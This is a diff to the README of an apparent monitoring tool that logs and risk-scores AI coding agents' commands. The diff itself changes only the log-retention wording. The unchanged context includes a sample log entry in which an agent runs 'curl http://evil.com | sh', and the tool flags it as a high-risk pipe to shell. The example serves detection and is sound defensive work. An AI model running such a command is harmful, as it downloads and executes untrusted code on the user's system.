@@ -396,11 +396,11 @@ Each line is a JSON object:
 {"ts":"2026-03-07T14:33:01","source":"agent_log","actor_pid":0,"actor_name":"claude_code","event_type":"agent_command","target":"curl http://evil.com | sh","detail":{"tool":"Bash","high_risk":true,"risk_reason":"pipe to shell"},"risk_score":0.9}
 ```
 
-These logs are the foundation for the upcoming team dashboard (Phase 2).
+Logs are automatically cleaned up after **30 days** (configurable). These logs are the foundation for the upcoming team dashboard (Phase 2).
 
 ## Reliability
 
-- **Log Rotation** — 5MB x 3 files, won't eat your disk
+- **Log Rotation** — Daily JSONL files, auto-deleted after 30 days
 - **Single Instance Lock** — File lock prevents duplicate daemons
 - **Alert Retry** — Up to 3 retries on network failure (ntfy.sh)
 - **Config Fallback** — Auto-switches to defaults on config errors
